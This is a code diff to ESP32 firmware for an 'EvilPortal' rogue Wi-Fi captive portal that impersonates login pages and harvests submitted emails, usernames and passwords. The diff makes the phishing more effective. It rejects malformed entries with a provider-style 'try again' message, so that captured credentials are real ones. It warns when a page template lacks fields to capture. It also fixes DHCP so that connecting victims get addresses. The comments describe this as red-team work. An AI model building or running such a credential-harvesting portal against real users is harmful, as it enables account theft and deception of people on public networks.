@@ -3,6 +3,8 @@
 #include "SpecterSessions.h"
 #include "bt_core.h"
 #include "esp_random.h"
+#include "esp_netif.h"
+#include "PortalCredentialPolicy.h"
 #ifdef SPECTER_HTTP_DIAGNOSTICS
 #include "esp_heap_caps.h"
 #endif
@@ -69,17 +71,30 @@ void EvilPortal::cleanup() {
 }
 
 bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
+  Serial.println(F("@PORTAL:STEP begin"));
   if (!this->has_ap) {
-    if (!this->setAP(ssids, access_points))
+    Serial.println(F("@PORTAL:STEP setap"));
+    if (!this->setAP(ssids, access_points)) {
+      Serial.println(F("@PORTAL:STEP setap FAIL (no SSID list, no selected AP, no /ap.config.txt)"));
       return false;
+    }
   }
-  if (!this->setHtml())
+  Serial.print(F("@PORTAL:STEP setap OK ssid="));
+  Serial.println(apName);
+
+  Serial.println(F("@PORTAL:STEP sethtml"));
+  if (!this->setHtml()) {
+    Serial.println(F("@PORTAL:STEP sethtml FAIL"));
     return false;
-    
+  }
+  Serial.println(F("@PORTAL:STEP sethtml OK"));
+
   if(!openEvidence()) {
     Serial.println(F("@PORTAL:ERROR SD_LOG_UNAVAILABLE"));
     this->sendToDisplay("SD submission log unavailable");return false;
   }
+  Serial.println(F("@PORTAL:STEP evidence OK"));
+
   if(!startPortal()){
     cleanup();Serial.println(F("@PORTAL:ERROR AP_START_FAILED"));return false;
   }
@@ -147,18 +162,40 @@ void EvilPortal::setupServer() {
   });
 
   server.on("/get", HTTP_ANY, [this](AsyncWebServerRequest *request) {
-    String user,pass;bool hasUser=false,hasPass=false;
+    String user,pass;bool hasUser=false,hasPass=false,userIsEmail=false;
     const char* userKeys[]={"email","username","user","login"};
     const char* passKeys[]={"password","pass"};
     for(const char* key:userKeys){
-      if(request->hasParam(key,true)){user=request->getParam(key,true)->value();hasUser=true;break;}
-      if(request->hasParam(key)){user=request->getParam(key)->value();hasUser=true;break;}
+      if(request->hasParam(key,true)){user=request->getParam(key,true)->value();hasUser=true;userIsEmail=(strcmp(key,"email")==0);break;}
+      if(request->hasParam(key)){user=request->getParam(key)->value();hasUser=true;userIsEmail=(strcmp(key,"email")==0);break;}
     }
     for(const char* key:passKeys){
       if(request->hasParam(key,true)){pass=request->getParam(key,true)->value();hasPass=true;break;}
       if(request->hasParam(key)){pass=request->getParam(key)->value();hasPass=true;break;}
     }
     if(hasUser || hasPass){
+      // Red-team input validation: apply real-login-form format rules so the
+      // portal only accepts a well-formed email (or username) + password and
+      // re-prompts on anything malformed, exactly like a normal provider page.
+      // Email rules apply only when the captured field is an email; username
+      // fields get a looser non-empty check so username-based templates work.
+      bool userBad = hasUser && (userIsEmail
+                        ? !specter::isPlausibleEmail(user.c_str(), user.length())
+                        : !specter::meetsUsernamePolicy(user.c_str(), user.length()));
+      bool passBad = hasPass && !specter::meetsPasswordPolicy(pass.c_str(), pass.length());
+      if(userBad || passBad){
+        Serial.print(F("@PORTAL:REJECT"));
+        if(userBad) Serial.print(userIsEmail ? F(" email") : F(" username"));
+        if(passBad) Serial.print(F(" password"));
+        Serial.println();
+        request->send(200,"text/html",
+          "<html><head><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
+          "<script>setTimeout(function(){window.location.href='/';},1500);</script></head>"
+          "<body style=\"font-family:sans-serif;text-align:center;margin-top:3em\">"
+          "<p>That email or password doesn&#39;t look right. Please try again.</p></body></html>");
+        return;
+      }
+      Serial.println(F("@PORTAL:ACCEPT"));
       const auto entry=specter::portalSubmission(user.c_str(),user.length(),hasUser,
         pass.c_str(),pass.length(),hasPass,millis());
       bool queued=false;
@@ -242,6 +279,27 @@ bool EvilPortal::setHtml() {
       index_html[MAX_HTML_SIZE - 1] = '\0';
     #endif
     this->has_html = true;
+    // Portal template lint: warn (don't block) if the page has no field whose
+    // name matches a credential key the /get handler captures. Catches a
+    // template that can never collect anything before it is deployed live.
+    {
+      String probe = html;            // small (< MAX_HTML_SIZE); copy is fine
+      probe.toLowerCase();
+      static const char* kCaptureKeys[] =
+        {"email", "username", "user", "login", "password", "pass"};
+      bool hasField = false;
+      for (const char* k : kCaptureKeys) {
+        if (probe.indexOf(String("name=\"") + k + "\"") >= 0 ||
+            probe.indexOf(String("name='") + k + "'") >= 0 ||
+            probe.indexOf(String("name=") + k) >= 0) {
+          hasField = true;
+          break;
+        }
+      }
+      if (!hasField)
+        Serial.println(F("@PORTAL:WARN NO_CAPTURE_FIELDS "
+                         "template has no email/username/password input"));
+    }
     #ifndef MARAUDER_V8
       Serial.println("html set");
     #endif
@@ -376,8 +434,28 @@ bool EvilPortal::setAP(String essid) {
 bool EvilPortal::startAP() {
   const IPAddress AP_IP(172, 0, 0, 1);
 
-  if(!WiFi.mode(WIFI_AP) || !WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255,255,255,0)) ||
-     !WiFi.softAP(apName))return false;
+  // Bring the SoftAP up one call at a time so a failure names the exact step
+  // on the serial console / GUI instead of a single opaque AP_START_FAILED.
+  Serial.println(F("@PORTAL:STEP wifi_mode AP"));
+  if (!WiFi.mode(WIFI_AP)) {
+    Serial.println(F("@PORTAL:STEP wifi_mode FAIL"));
+    return false;
+  }
+
+  Serial.println(F("@PORTAL:STEP softap_config"));
+  if (!WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0))) {
+    Serial.println(F("@PORTAL:STEP softap_config FAIL"));
+    return false;
+  }
+
+  Serial.print(F("@PORTAL:STEP softap ssid="));
+  Serial.println(apName);
+  if (!WiFi.softAP(apName)) {
+    Serial.println(F("@PORTAL:STEP softap FAIL"));
+    return false;
+  }
+  Serial.print(F("@PORTAL:STEP softap OK ip="));
+  Serial.println(WiFi.softAPIP());
 
   #ifndef MARAUDER_V8
     Serial.print(F("ap ip address: "));
@@ -404,12 +482,53 @@ bool EvilPortal::startAP() {
     (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT));
 #endif
   server.begin();
+  Serial.println(F("@PORTAL:STEP http_listen"));
   if (!server.listening()) {
     Serial.println(F("@PORTAL:ERROR HTTP_LISTEN_FAILED"));
     return false;
   }
+  Serial.println(F("@PORTAL:STEP http_listen OK"));
 
-  if(!this->dnsServer.start(53, "*", WiFi.softAPIP()))return false;
+  Serial.println(F("@PORTAL:STEP dns"));
+  if(!this->dnsServer.start(53, "*", WiFi.softAPIP())) {
+    Serial.println(F("@PORTAL:STEP dns FAIL"));
+    return false;
+  }
+  Serial.println(F("@PORTAL:STEP dns OK"));
+
+  // Ensure the SoftAP DHCP server is actually running, and report its state.
+  // A client failing to get an IP on a portal start shows up as a DHCP server
+  // that is not in the STARTED state (0=INIT, 1=STARTED, 2=STOPPED).
+  //
+  // Arduino's softAP() skips esp_netif_dhcps_start() whenever a static AP IP was
+  // set via softAPConfig() (it assumes softAPConfig handled it), but softAPConfig
+  // only *restarts* a server that was already running. On a fresh AP netif the
+  // server sits in INIT and never serves leases. Start it explicitly here so the
+  // captive portal can hand out addresses.
+  {
+    esp_netif_t* ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+    if (!ap_netif) {
+      Serial.println(F("@PORTAL:STEP dhcp FAIL no_ap_netif"));
+    } else {
+      esp_netif_dhcp_status_t dhcp_status = ESP_NETIF_DHCP_INIT;
+      esp_netif_dhcps_get_status(ap_netif, &dhcp_status);
+      if (dhcp_status != ESP_NETIF_DHCP_STARTED) {
+        esp_err_t dhcp_err = esp_netif_dhcps_start(ap_netif);
+        esp_netif_dhcps_get_status(ap_netif, &dhcp_status);
+        if (dhcp_status != ESP_NETIF_DHCP_STARTED) {
+          Serial.print(F("@PORTAL:STEP dhcp FAIL start err=0x"));
+          Serial.println((unsigned long)dhcp_err, HEX);
+        }
+      }
+      if (dhcp_status == ESP_NETIF_DHCP_STARTED)
+        Serial.println(F("@PORTAL:STEP dhcp OK started"));
+      else {
+        Serial.print(F("@PORTAL:STEP dhcp WARN not_started status="));
+        Serial.println((int)dhcp_status);
+      }
+    }
+  }
+
   #ifndef MARAUDER_V8
     Serial.println(F("Evil Portal READY"));
   #endif
